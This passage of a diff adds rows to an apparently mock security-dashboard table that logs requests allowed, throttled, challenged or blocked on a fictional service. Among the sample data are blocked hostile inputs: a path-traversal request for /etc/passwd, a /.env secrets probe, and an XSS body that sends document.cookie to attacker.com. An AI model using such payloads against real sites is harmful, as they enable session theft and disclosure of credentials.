+<td class="px-3 py-1 text-right pr-4 whitespace-nowrap">
+<button class="px-2 py-1 rounded bg-surface-container-high hover:bg-surface-bright text-primary hover:text-on-surface text-telemetry-inline font-telemetry-inline transition-colors inline-flex items-center gap-1" onclick="openInspector('req_e29b1090', '82.165.197.1', 'PUT /api/v2/users/credentials', 'Step-up challenge prompted (WebAuthn biometric)', 'VERIFY', '68', 'Headers: Host: api.sentraweb.io\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nSec-Ch-Ua-Platform: \x22Windows\x22\nClient-ASN: AS8560\n\nChallenge-Issued: WebAuthn-FIDO2-Key\nStatus: Pending Handshake response')">
+<span class="material-symbols-outlined text-sm">visibility</span> View Raw
+                </button>
+</td>
+</tr>
+<!-- ROW 3: RESTRICT Rate Throttled -->
+<tr class="h-9 hover:bg-primary-container/10 transition-colors bg-surface/30 group" data-action="RESTRICT" data-req="req_bc81203f" data-risk="45">
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-on-surface-variant">2025-05-18 14:38:11.104</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-primary">
+<span class="cursor-pointer hover:underline" onclick="copyText('req_bc81203f')">req_bc81203f</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<a class="text-secondary hover:text-primary transition-colors flex items-center gap-0.5" href="#">
+                  sess_aa77b102
+                  <span class="material-symbols-outlined text-[12px]">open_in_new</span>
+</a>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="text-on-surface font-medium">103.251.167.20</span>
+<span class="text-outline text-[10px] ml-1">AS133118 (IN)</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="px-1 rounded bg-surface-container-highest text-primary font-bold text-[10px] mr-1">GET</span>
+<span class="text-on-surface">/api/v1/inventory/items</span>
+</td>
+<td class="px-3 py-1 text-center font-telemetry-data text-telemetry-inline">
+<span class="inline-block px-1.5 py-0.5 rounded font-bold bg-secondary/20 text-secondary">45</span>
+</td>
+<td class="px-3 py-1 whitespace-nowrap">
+<span class="inline-flex items-center gap-1 font-badge-label text-badge-label uppercase px-2 py-0.5 rounded bg-secondary/20 text-secondary font-bold">
+<span class="w-1.5 h-1.5 rounded-full bg-secondary"></span> RESTRICT
+                </span>
+</td>
+<td class="px-3 py-1 font-body-sm text-body-sm text-on-surface truncate max-w-xs" title="Exceeded 50 req/s rate threshold (Bursting 78 req/s)">
+                Exceeded 50 req/s rate threshold
+              </td>
+<td class="px-3 py-1 text-right pr-4 whitespace-nowrap">
+<button class="px-2 py-1 rounded bg-surface-container-high hover:bg-surface-bright text-primary hover:text-on-surface text-telemetry-inline font-telemetry-inline transition-colors inline-flex items-center gap-1" onclick="openInspector('req_bc81203f', '103.251.167.20', 'GET /api/v1/inventory/items', 'Rate clamp applied: 1 req/s token bucket', 'RESTRICT', '45', 'Headers: Host: api.sentraweb.io\nUser-Agent: python-requests/2.31.0\nAccept-Encoding: gzip, deflate\nX-RateLimit-Limit: 50\nX-RateLimit-Current: 78\nAction: Enforced HTTP 429 Retry-After: 60s')">
+<span class="material-symbols-outlined text-sm">visibility</span> View Raw
+                </button>
+</td>
+</tr>
+<!-- ROW 4: ALLOW Clean Telemetry -->
+<tr class="h-9 hover:bg-primary-container/10 transition-colors bg-surface-container-high/20 group" data-action="ALLOW" data-req="req_0029bfa1" data-risk="08">
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-on-surface-variant">2025-05-18 14:38:10.950</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-primary">
+<span class="cursor-pointer hover:underline" onclick="copyText('req_0029bfa1')">req_0029bfa1</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<a class="text-secondary hover:text-primary transition-colors flex items-center gap-0.5" href="#">
+                  sess_cc8811d0
+                  <span class="material-symbols-outlined text-[12px]">open_in_new</span>
+</a>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="text-on-surface font-medium">172.56.21.89</span>
+<span class="text-outline text-[10px] ml-1">AS21928 (US)</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="px-1 rounded bg-surface-container-highest text-primary font-bold text-[10px] mr-1">GET</span>
+<span class="text-on-surface">/app/dashboard/metrics</span>
+</td>
+<td class="px-3 py-1 text-center font-telemetry-data text-telemetry-inline">
+<span class="inline-block px-1.5 py-0.5 rounded font-bold bg-tertiary/20 text-tertiary">08</span>
+</td>
+<td class="px-3 py-1 whitespace-nowrap">
+<span class="inline-flex items-center gap-1 font-badge-label text-badge-label uppercase px-2 py-0.5 rounded bg-tertiary/20 text-tertiary font-bold">
+<span class="w-1.5 h-1.5 rounded-full bg-tertiary"></span> ALLOW
+                </span>
+</td>
+<td class="px-3 py-1 font-body-sm text-body-sm text-on-surface truncate max-w-xs" title="Clean telemetry, valid JWT &amp; device posture verified">
+                Clean telemetry, verified posture
+              </td>
+<td class="px-3 py-1 text-right pr-4 whitespace-nowrap">
+<button class="px-2 py-1 rounded bg-surface-container-high hover:bg-surface-bright text-primary hover:text-on-surface text-telemetry-inline font-telemetry-inline transition-colors inline-flex items-center gap-1" onclick="openInspector('req_0029bfa1', '172.56.21.89', 'GET /app/dashboard/metrics', 'Clean session, standard JWT pass', 'ALLOW', '08', 'Headers: Host: app.sentraweb.io\nAuthorization: Bearer eyJhbGciOi...\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\nAccept: application/json\nResponse: 200 OK (14ms)')">
+<span class="material-symbols-outlined text-sm">visibility</span> View Raw
+                </button>
+</td>
+</tr>
+<!-- ROW 5: BLOCK Tor Exit Node Flag -->
+<tr class="h-9 hover:bg-primary-container/10 transition-colors bg-surface/30 group" data-action="BLOCK" data-req="req_66f2c00a" data-risk="91">
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-on-surface-variant">2025-05-18 14:38:09.610</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-primary">
+<span class="cursor-pointer hover:underline" onclick="copyText('req_66f2c00a')">req_66f2c00a</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<a class="text-secondary hover:text-primary transition-colors flex items-center gap-0.5" href="#">
+                  sess_01ab8872
+                  <span class="material-symbols-outlined text-[12px]">open_in_new</span>
+</a>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="text-on-surface font-medium">185.220.101.44</span>
+<span class="text-outline text-[10px] ml-1">AS208323 (NL)</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="px-1 rounded bg-surface-container-highest text-primary font-bold text-[10px] mr-1">GET</span>
+<span class="text-on-surface">/admin/users/export</span>
+</td>
+<td class="px-3 py-1 text-center font-telemetry-data text-telemetry-inline">
+<span class="inline-block px-1.5 py-0.5 rounded font-bold bg-error/20 text-error">91</span>
+</td>
+<td class="px-3 py-1 whitespace-nowrap">
+<span class="inline-flex items-center gap-1 font-badge-label text-badge-label uppercase px-2 py-0.5 rounded bg-error/20 text-error font-bold">
+<span class="w-1.5 h-1.5 rounded-full bg-error"></span> BLOCK
+                </span>
+</td>
+<td class="px-3 py-1 font-body-sm text-body-sm text-on-surface truncate max-w-xs" title="Tor Exit Node flag + Zero-trust admin boundary access">
+                Tor Exit Node flag on admin boundary
+              </td>
+<td class="px-3 py-1 text-right pr-4 whitespace-nowrap">
+<button class="px-2 py-1 rounded bg-surface-container-high hover:bg-surface-bright text-primary hover:text-on-surface text-telemetry-inline font-telemetry-inline transition-colors inline-flex items-center gap-1" onclick="openInspector('req_66f2c00a', '185.220.101.44', 'GET /admin/users/export', 'Tor exit node flagged via threat feed threat-intel-feed-4', 'BLOCK', '91', 'Headers: Host: internal.sentraweb.io\nX-Tor-Node: confirmed\nCipher: TLS_AES_128_GCM_SHA256\nDecision: TCP Drop + Firewalled at Border')">
+<span class="material-symbols-outlined text-sm">visibility</span> View Raw
+                </button>
+</td>
+</tr>
+<!-- ROW 6: BLOCK Directory Traversal -->
+<tr class="h-9 hover:bg-primary-container/10 transition-colors bg-surface-container-high/20 group" data-action="BLOCK" data-req="req_dd341a09" data-risk="98">
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-on-surface-variant">2025-05-18 14:38:08.211</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-primary">
+<span class="cursor-pointer hover:underline" onclick="copyText('req_dd341a09')">req_dd341a09</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<a class="text-secondary hover:text-primary transition-colors flex items-center gap-0.5" href="#">
+                  sess_ee4312aa
+                  <span class="material-symbols-outlined text-[12px]">open_in_new</span>
+</a>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="text-on-surface font-medium">45.146.165.37</span>
+<span class="text-outline text-[10px] ml-1">AS44050 (RO)</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="px-1 rounded bg-surface-container-highest text-primary font-bold text-[10px] mr-1">GET</span>
+<span class="text-on-surface">/static/..%2f..%2fetc/passwd</span>
+</td>
+<td class="px-3 py-1 text-center font-telemetry-data text-telemetry-inline">
+<span class="inline-block px-1.5 py-0.5 rounded font-bold bg-error/20 text-error">98</span>
+</td>
+<td class="px-3 py-1 whitespace-nowrap">
+<span class="inline-flex items-center gap-1 font-badge-label text-badge-label uppercase px-2 py-0.5 rounded bg-error/20 text-error font-bold">
+<span class="w-1.5 h-1.5 rounded-full bg-error"></span> BLOCK
+                </span>
+</td>
+<td class="px-3 py-1 font-body-sm text-body-sm text-on-surface truncate max-w-xs" title="Path Traversal attempt (CVE-2021-41773 pattern)">
+                Path Traversal attempt in URI path
+              </td>
+<td class="px-3 py-1 text-right pr-4 whitespace-nowrap">
+<button class="px-2 py-1 rounded bg-surface-container-high hover:bg-surface-bright text-primary hover:text-on-surface text-telemetry-inline font-telemetry-inline transition-colors inline-flex items-center gap-1" onclick="openInspector('req_dd341a09', '45.146.165.37', 'GET /static/..%2f..%2fetc/passwd', 'WAF Rule: OWASP CRS 930100 Traversal', 'BLOCK', '98', 'URI: /static/..%2f..%2fetc/passwd\nHex: 2e 2e 25 32 66 2e 2e 25 32 66\nMatched: File inclusion attack vector\nAction: 403 Forbidden')">
+<span class="material-symbols-outlined text-sm">visibility</span> View Raw
+                </button>
+</td>
+</tr>
+<!-- ROW 7: VERIFY Captcha challenge -->
+<tr class="h-9 hover:bg-primary-container/10 transition-colors bg-surface/30 group" data-action="VERIFY" data-req="req_7781b01c" data-risk="58">
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-on-surface-variant">2025-05-18 14:38:07.892</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-primary">
+<span class="cursor-pointer hover:underline" onclick="copyText('req_7781b01c')">req_7781b01c</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<a class="text-secondary hover:text-primary transition-colors flex items-center gap-0.5" href="#">
+                  sess_55cc9981
+                  <span class="material-symbols-outlined text-[12px]">open_in_new</span>
+</a>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="text-on-surface font-medium">198.51.100.42</span>
+<span class="text-outline text-[10px] ml-1">AS7018 (US)</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="px-1 rounded bg-error-container text-on-error-container font-bold text-[10px] mr-1">POST</span>
+<span class="text-on-surface">/api/v1/auth/signup</span>
+</td>
+<td class="px-3 py-1 text-center font-telemetry-data text-telemetry-inline">
+<span class="inline-block px-1.5 py-0.5 rounded font-bold bg-primary/20 text-primary">58</span>
+</td>
+<td class="px-3 py-1 whitespace-nowrap">
+<span class="inline-flex items-center gap-1 font-badge-label text-badge-label uppercase px-2 py-0.5 rounded bg-primary/20 text-primary font-bold">
+<span class="w-1.5 h-1.5 rounded-full bg-primary"></span> VERIFY
+                </span>
+</td>
+<td class="px-3 py-1 font-body-sm text-body-sm text-on-surface truncate max-w-xs" title="Rapid registration attempts from headless Chrome">
+                Headless browser anomaly in signup
+              </td>
+<td class="px-3 py-1 text-right pr-4 whitespace-nowrap">
+<button class="px-2 py-1 rounded bg-surface-container-high hover:bg-surface-bright text-primary hover:text-on-surface text-telemetry-inline font-telemetry-inline transition-colors inline-flex items-center gap-1" onclick="openInspector('req_7781b01c', '198.51.100.42', 'POST /api/v1/auth/signup', 'Silent Turnstile + PoW math puzzle presented', 'VERIFY', '58', 'User-Agent: Mozilla/5.0 HeadlessChrome/118.0\nWebGL-Vendor: Google Inc. (NVIDIA)\nMissing-Plugins: true\nAction: CAPTCHA v3 challenge sent')">
+<span class="material-symbols-outlined text-sm">visibility</span> View Raw
+                </button>
+</td>
+</tr>
+<!-- ROW 8: ALLOW Standard API Read -->
+<tr class="h-9 hover:bg-primary-container/10 transition-colors bg-surface-container-high/20 group" data-action="ALLOW" data-req="req_11a880ff" data-risk="04">
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-on-surface-variant">2025-05-18 14:38:06.502</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-primary">
+<span class="cursor-pointer hover:underline" onclick="copyText('req_11a880ff')">req_11a880ff</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<a class="text-secondary hover:text-primary transition-colors flex items-center gap-0.5" href="#">
+                  sess_8812401f
+                  <span class="material-symbols-outlined text-[12px]">open_in_new</span>
+</a>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="text-on-surface font-medium">13.233.19.14</span>
+<span class="text-outline text-[10px] ml-1">AS16509 (SG)</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="px-1 rounded bg-surface-container-highest text-primary font-bold text-[10px] mr-1">GET</span>
+<span class="text-on-surface">/api/v2/telemetry/heartbeat</span>
+</td>
+<td class="px-3 py-1 text-center font-telemetry-data text-telemetry-inline">
+<span class="inline-block px-1.5 py-0.5 rounded font-bold bg-tertiary/20 text-tertiary">04</span>
+</td>
+<td class="px-3 py-1 whitespace-nowrap">
+<span class="inline-flex items-center gap-1 font-badge-label text-badge-label uppercase px-2 py-0.5 rounded bg-tertiary/20 text-tertiary font-bold">
+<span class="w-1.5 h-1.5 rounded-full bg-tertiary"></span> ALLOW
+                </span>
+</td>
+<td class="px-3 py-1 font-body-sm text-body-sm text-on-surface truncate max-w-xs" title="Known cluster gateway health-check sync">
+                Internal health check probe
+              </td>
+<td class="px-3 py-1 text-right pr-4 whitespace-nowrap">
+<button class="px-2 py-1 rounded bg-surface-container-high hover:bg-surface-bright text-primary hover:text-on-surface text-telemetry-inline font-telemetry-inline transition-colors inline-flex items-center gap-1" onclick="openInspector('req_11a880ff', '13.233.19.14', 'GET /api/v2/telemetry/heartbeat', 'Mutual TLS verification passed', 'ALLOW', '04', 'TLS-Cert: CN=sentra-internal-gw-01\nMutual-Auth: Verified\nResponse: 200 OK (2ms)')">
+<span class="material-symbols-outlined text-sm">visibility</span> View Raw
+                </button>
+</td>
+</tr>
+<!-- ROW 9: RESTRICT API Bursting -->
+<tr class="h-9 hover:bg-primary-container/10 transition-colors bg-surface/30 group" data-action="RESTRICT" data-req="req_4482aa00" data-risk="48">
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-on-surface-variant">2025-05-18 14:38:05.109</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-primary">
+<span class="cursor-pointer hover:underline" onclick="copyText('req_4482aa00')">req_4482aa00</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<a class="text-secondary hover:text-primary transition-colors flex items-center gap-0.5" href="#">
+                  sess_33dd1192
+                  <span class="material-symbols-outlined text-[12px]">open_in_new</span>
+</a>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="text-on-surface font-medium">92.204.60.18</span>
+<span class="text-outline text-[10px] ml-1">AS24940 (DE)</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="px-1 rounded bg-surface-container-highest text-primary font-bold text-[10px] mr-1">GET</span>
+<span class="text-on-surface">/api/v1/search?q=export</span>
+</td>
+<td class="px-3 py-1 text-center font-telemetry-data text-telemetry-inline">
+<span class="inline-block px-1.5 py-0.5 rounded font-bold bg-secondary/20 text-secondary">48</span>
+</td>
+<td class="px-3 py-1 whitespace-nowrap">
+<span class="inline-flex items-center gap-1 font-badge-label text-badge-label uppercase px-2 py-0.5 rounded bg-secondary/20 text-secondary font-bold">
+<span class="w-1.5 h-1.5 rounded-full bg-secondary"></span> RESTRICT
+                </span>
+</td>
+<td class="px-3 py-1 font-body-sm text-body-sm text-on-surface truncate max-w-xs" title="Aggressive scraping pagination pattern detected">
+                Aggressive pagination scraping rate
+              </td>
+<td class="px-3 py-1 text-right pr-4 whitespace-nowrap">
+<button class="px-2 py-1 rounded bg-surface-container-high hover:bg-surface-bright text-primary hover:text-on-surface text-telemetry-inline font-telemetry-inline transition-colors inline-flex items-center gap-1" onclick="openInspector('req_4482aa00', '92.204.60.18', 'GET /api/v1/search?q=export', 'ElasticSearch resource safeguard triggered', 'RESTRICT', '48', 'Headers: Host: api.sentraweb.io\nQuery: q=export&amp;page=9999\nCPU Cost: 180ms\nThrottle: Leaky bucket quota applied')">
+<span class="material-symbols-outlined text-sm">visibility</span> View Raw
+                </button>
+</td>
+</tr>
+<!-- ROW 10: BLOCK XSS Reflection -->
+<tr class="h-9 hover:bg-primary-container/10 transition-colors bg-surface-container-high/20 group" data-action="BLOCK" data-req="req_fe1089bc" data-risk="88">
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-on-surface-variant">2025-05-18 14:38:04.019</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-primary">
+<span class="cursor-pointer hover:underline" onclick="copyText('req_fe1089bc')">req_fe1089bc</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<a class="text-secondary hover:text-primary transition-colors flex items-center gap-0.5" href="#">
+                  sess_5561a009
+                  <span class="material-symbols-outlined text-[12px]">open_in_new</span>
+</a>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="text-on-surface font-medium">103.85.24.11</span>
+<span class="text-outline text-[10px] ml-1">AS55836 (ID)</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="px-1 rounded bg-error-container text-on-error-container font-bold text-[10px] mr-1">POST</span>
+<span class="text-on-surface">/app/tickets/comment</span>
+</td>
+<td class="px-3 py-1 text-center font-telemetry-data text-telemetry-inline">
+<span class="inline-block px-1.5 py-0.5 rounded font-bold bg-error/20 text-error">88</span>
+</td>
+<td class="px-3 py-1 whitespace-nowrap">
+<span class="inline-flex items-center gap-1 font-badge-label text-badge-label uppercase px-2 py-0.5 rounded bg-error/20 text-error font-bold">
+<span class="w-1.5 h-1.5 rounded-full bg-error"></span> BLOCK
+                </span>
+</td>
+<td class="px-3 py-1 font-body-sm text-body-sm text-on-surface truncate max-w-xs" title="Cross-Site Scripting (XSS) payload: &lt;script&gt;fetch(...)">
+                Cross-Site Scripting (XSS) payload
+              </td>
+<td class="px-3 py-1 text-right pr-4 whitespace-nowrap">
+<button class="px-2 py-1 rounded bg-surface-container-high hover:bg-surface-bright text-primary hover:text-on-surface text-telemetry-inline font-telemetry-inline transition-colors inline-flex items-center gap-1" onclick="openInspector('req_fe1089bc', '103.85.24.11', 'POST /app/tickets/comment', 'Payload sanitized &amp; connection terminated', 'BLOCK', '88', 'Body snippet:\n{\x22comment\x22: \x22&lt;script&gt;fetch(\x27//attacker.com/steal?c=\x27+document.cookie)&lt;/script&gt;\x22}\nWAF Trigger: Signature XSS-004')">
+<span class="material-symbols-outlined text-sm">visibility</span> View Raw
+                </button>
+</td>
+</tr>
+<!-- ROW 11: ALLOW Edge CDN Route -->
+<tr class="h-9 hover:bg-primary-container/10 transition-colors bg-surface/30 group" data-action="ALLOW" data-req="req_876bb012" data-risk="02">
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-on-surface-variant">2025-05-18 14:38:03.412</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-primary">
+<span class="cursor-pointer hover:underline" onclick="copyText('req_876bb012')">req_876bb012</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<a class="text-secondary hover:text-primary transition-colors flex items-center gap-0.5" href="#">
+                  sess_9002ffea
+                  <span class="material-symbols-outlined text-[12px]">open_in_new</span>
+</a>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="text-on-surface font-medium">151.101.65.140</span>
+<span class="text-outline text-[10px] ml-1">AS54113 (US)</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="px-1 rounded bg-surface-container-highest text-primary font-bold text-[10px] mr-1">GET</span>
+<span class="text-on-surface">/assets/core-bundle.min.js</span>
+</td>
+<td class="px-3 py-1 text-center font-telemetry-data text-telemetry-inline">
+<span class="inline-block px-1.5 py-0.5 rounded font-bold bg-tertiary/20 text-tertiary">02</span>
+</td>
+<td class="px-3 py-1 whitespace-nowrap">
+<span class="inline-flex items-center gap-1 font-badge-label text-badge-label uppercase px-2 py-0.5 rounded bg-tertiary/20 text-tertiary font-bold">
+<span class="w-1.5 h-1.5 rounded-full bg-tertiary"></span> ALLOW
+                </span>
+</td>
+<td class="px-3 py-1 font-body-sm text-body-sm text-on-surface truncate max-w-xs" title="Static asset cached hit from Fastly edge cache">
+                Static asset hit from CDN cache
+              </td>
+<td class="px-3 py-1 text-right pr-4 whitespace-nowrap">
+<button class="px-2 py-1 rounded bg-surface-container-high hover:bg-surface-bright text-primary hover:text-on-surface text-telemetry-inline font-telemetry-inline transition-colors inline-flex items-center gap-1" onclick="openInspector('req_876bb012', '151.101.65.140', 'GET /assets/core-bundle.min.js', 'Cache status: HIT', 'ALLOW', '02', 'Cache-Control: public, max-age=31536000\nX-Served-By: cache-iad-kj982\nResponse: 304 Not Modified')">
+<span class="material-symbols-outlined text-sm">visibility</span> View Raw
+                </button>
+</td>
+</tr>
+<!-- ROW 12: VERIFY Step-Up MFA -->
+<tr class="h-9 hover:bg-primary-container/10 transition-colors bg-surface-container-high/20 group" data-action="VERIFY" data-req="req_6541ee90" data-risk="62">
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-on-surface-variant">2025-05-18 14:38:02.190</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-primary">
+<span class="cursor-pointer hover:underline" onclick="copyText('req_6541ee90')">req_6541ee90</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<a class="text-secondary hover:text-primary transition-colors flex items-center gap-0.5" href="#">
+                  sess_3377dd01
+                  <span class="material-symbols-outlined text-[12px]">open_in_new</span>
+</a>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="text-on-surface font-medium">185.191.171.18</span>
+<span class="text-outline text-[10px] ml-1">AS396982 (GB)</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="px-1 rounded bg-surface-container-highest text-on-surface-variant font-bold text-[10px] mr-1">PUT</span>
+<span class="text-on-surface">/api/v1/billing/payment-method</span>
+</td>
+<td class="px-3 py-1 text-center font-telemetry-data text-telemetry-inline">
+<span class="inline-block px-1.5 py-0.5 rounded font-bold bg-primary/20 text-primary">62</span>
+</td>
+<td class="px-3 py-1 whitespace-nowrap">
+<span class="inline-flex items-center gap-1 font-badge-label text-badge-label uppercase px-2 py-0.5 rounded bg-primary/20 text-primary font-bold">
+<span class="w-1.5 h-1.5 rounded-full bg-primary"></span> VERIFY
+                </span>
+</td>
+<td class="px-3 py-1 font-body-sm text-body-sm text-on-surface truncate max-w-xs" title="Sensitive payment change triggered mandatory MFA push">
+                High-privilege financial endpoint rule
+              </td>
+<td class="px-3 py-1 text-right pr-4 whitespace-nowrap">
+<button class="px-2 py-1 rounded bg-surface-container-high hover:bg-surface-bright text-primary hover:text-on-surface text-telemetry-inline font-telemetry-inline transition-colors inline-flex items-center gap-1" onclick="openInspector('req_6541ee90', '185.191.171.18', 'PUT /api/v1/billing/payment-method', 'Mandatory step-up 2FA triggered', 'VERIFY', '62', 'Policy: PCI-DSS-Strict-Auth\nTrigger: Stripe card update\nRequired: TOTP/Passkey step-up')">
+<span class="material-symbols-outlined text-sm">visibility</span> View Raw
+                </button>
+</td>
+</tr>
+<!-- ROW 13: BLOCK Known Bot Scanner -->
+<tr class="h-9 hover:bg-primary-container/10 transition-colors bg-surface/30 group" data-action="BLOCK" data-req="req_234bb761" data-risk="97">
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-on-surface-variant">2025-05-18 14:38:01.050</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-primary">
+<span class="cursor-pointer hover:underline" onclick="copyText('req_234bb761')">req_234bb761</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<a class="text-secondary hover:text-primary transition-colors flex items-center gap-0.5" href="#">
+                  sess_8899aa12
+                  <span class="material-symbols-outlined text-[12px]">open_in_new</span>
+</a>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="text-on-surface font-medium">193.169.255.77</span>
+<span class="text-outline text-[10px] ml-1">AS49505 (RU)</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="px-1 rounded bg-surface-container-highest text-primary font-bold text-[10px] mr-1">GET</span>
+<span class="text-on-surface">/.env</span>
+</td>
+<td class="px-3 py-1 text-center font-telemetry-data text-telemetry-inline">
+<span class="inline-block px-1.5 py-0.5 rounded font-bold bg-error/20 text-error">97</span>
+</td>
+<td class="px-3 py-1 whitespace-nowrap">
+<span class="inline-flex items-center gap-1 font-badge-label text-badge-label uppercase px-2 py-0.5 rounded bg-error/20 text-error font-bold">
+<span class="w-1.5 h-1.5 rounded-full bg-error"></span> BLOCK
+                </span>
+</td>
+<td class="px-3 py-1 font-body-sm text-body-sm text-on-surface truncate max-w-xs" title="Environment file disclosure probe">
+                Env secrets crawler probe
+              </td>
+<td class="px-3 py-1 text-right pr-4 whitespace-nowrap">
+<button class="px-2 py-1 rounded bg-surface-container-high hover:bg-surface-bright text-primary hover:text-on-surface text-telemetry-inline font-telemetry-inline transition-colors inline-flex items-center gap-1" onclick="openInspector('req_234bb761', '193.169.255.77', 'GET /.env', 'Automated reconnaissance crawler blocked', 'BLOCK', '97', 'Request: GET /.env HTTP/1.1\nUser-Agent: masscan/1.0\nThreat Feed: Blocked in SOC Rule 4001\nAction: Immediate RST')">
+<span class="material-symbols-outlined text-sm">visibility</span> View Raw
+                </button>
+</td>
+</tr>
+<!-- ROW 14: RESTRICT Rate Limit Violation -->
+<tr class="h-9 hover:bg-primary-container/10 transition-colors bg-surface-container-high/20 group" data-action="RESTRICT" data-req="req_5621890a" data-risk="42">
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-on-surface-variant">2025-05-18 14:38:00.812</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap text-primary">
+<span class="cursor-pointer hover:underline" onclick="copyText('req_5621890a')">req_5621890a</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<a class="text-secondary hover:text-primary transition-colors flex items-center gap-0.5" href="#">
+                  sess_4422dd81
+                  <span class="material-symbols-outlined text-[12px]">open_in_new</span>
+</a>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="text-on-surface font-medium">104.28.19.45</span>
+<span class="text-outline text-[10px] ml-1">AS13335 (US)</span>
+</td>
+<td class="px-3 py-1 font-telemetry-data text-telemetry-inline whitespace-nowrap">
+<span class="px-1 rounded bg-error-container text-on-error-container font-bold text-[10px] mr-1">POST</span>
+<span class="text-on-surface">/api/v1/auth/forgot-password</span>
+</td>
+<td class="px-3 py-1 text-center font-telemetry-data text-telemetry-inline">
+<span class="inline-block px-1.5 py-0.5 rounded font-bold bg-secondary/20 text-secondary">42</span>
+</td>
+<td class="px-3 py-1 whitespace-nowrap">
+<span class="inline-flex items-center gap-1 font-badge-label text-badge-label uppercase px-2 py-0.5 rounded bg-secondary/20 text-secondary font-bold">
+<span class="w-1.5 h-1.5 rounded-full bg-secondary"></span> RESTRICT
+                </span>
+</td>
